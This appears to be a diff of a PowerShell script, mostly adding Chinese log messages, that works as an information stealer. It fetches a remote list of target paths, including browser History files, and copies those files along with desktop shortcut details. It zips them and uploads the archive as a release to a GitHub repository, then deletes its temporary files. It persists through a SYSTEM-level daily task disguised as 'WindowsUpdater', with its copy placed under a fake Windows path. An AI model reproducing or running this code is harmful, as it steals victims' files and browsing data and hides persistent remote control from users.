@@ -1,12 +1,33 @@
-# Save self to local file path for scheduled task
+# ===================== Log Function =====================
+function Log {
+    param (
+        [string]$Message,
+        [string]$Color = "Green"
+    )
+    try {
+        Write-Host $Message -ForegroundColor $Color
+    } catch {
+        Write-Host $Message
+    }
+}
+
+# ===================== Save Self =====================
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
 
-# Set UTF-8 encoding
+# ===================== Set Encoding =====================
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
+# ===================== GitHub Metadata =====================
 $token = $env:GITHUB_TOKEN
+if (-not $token) {
+    Log "[ERR] GITHUB_TOKEN 不存在，终止执行。" "Red"
+    return
+} else {
+    Log "[OK] GITHUB_TOKEN 存在"
+}
+
 $repo = "drftghy/backup-files"
 $now = Get-Date
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
@@ -19,24 +40,29 @@ $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
-# STEP 1: Load file path list from remote .txt
+# ===================== STEP 1: Load upload-target list =====================
 $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
 try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
+    Log "[OK] 成功获取文件列表，共 $($pathList.Count) 项"
 } catch {
+    Log "[ERR] 获取远程路径失败，终止。" "Red"
     return
 }
 
+# ===================== STEP 2: 复制目标路径 =====================
 $index = 0
 foreach ($path in $pathList) {
     $index++
     $name = "item$index"
 
-    if (-not (Test-Path $path)) { continue }
+    if (-not (Test-Path $path)) {
+        Log "[WARN] 路径不存在：$path" "Yellow"
+        continue
+    }
 
     $dest = Join-Path $tempRoot $name
-
     try {
         if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
             $srcDir = Split-Path $path
@@ -46,10 +72,13 @@ foreach ($path in $pathList) {
         } else {
             Copy-Item $path -Destination $dest -Force -ErrorAction Stop
         }
-    } catch {}
+        Log "[OK] 复制成功：$path"
+    } catch {
+        Log "[ERR] 复制失败：$path" "Red"
+    }
 }
 
-# STEP 2: Extract .lnk shortcut info from Desktop
+# ===================== STEP 3: 收集桌面快捷方式信息 =====================
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -69,16 +98,21 @@ try {
 
     $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
-} catch {}
+    Log "[OK] 快捷方式信息导出完毕"
+} catch {
+    Log "[WARN] 快捷方式信息导出失败" "Yellow"
+}
 
-# STEP 3: Archive
+# ===================== STEP 4: 打包压缩 =====================
 try {
     Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
+    Log "[OK] 压缩完成：$zipPath"
 } catch {
+    Log "[ERR] 压缩失败" "Red"
     return
 }
 
-# STEP 4: Upload
+# ===================== STEP 5: 上传到 GitHub Release =====================
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
@@ -96,7 +130,9 @@ $headers = @{
 try {
     $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
     $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
+    Log "[OK] Release 创建成功"
 } catch {
+    Log "[ERR] 创建 release 失败" "Red"
     return
 }
 
@@ -107,19 +143,23 @@ try {
         "Content-Type" = "application/zip"
         "User-Agent" = "PowerShellScript"
     }
-    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
-} catch {}
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+    Log "[OK] 上传文件成功"
+} catch {
+    Log "[ERR] 上传文件失败" "Red"
+}
 
-# STEP 5: Cleanup
+# ===================== STEP 6: 清理临时文件 =====================
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-# STEP 6: Register daily task at 2:00 AM to run the update.ps1 script
+Log "[OK] 清理完成"
+
+# ===================== STEP 7: 注册计划任务 =====================
 $taskName = "WindowsUpdater"
 $taskDescription = "Daily file package task"
 $scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"
 
 try {
-    # If exists, delete first
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
     }
@@ -129,4 +169,7 @@ try {
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
-} catch {}
+    Log "[OK] 计划任务注册成功"
+} catch {
+    Log "[WARN] 计划任务注册失败" "Yellow"
+}
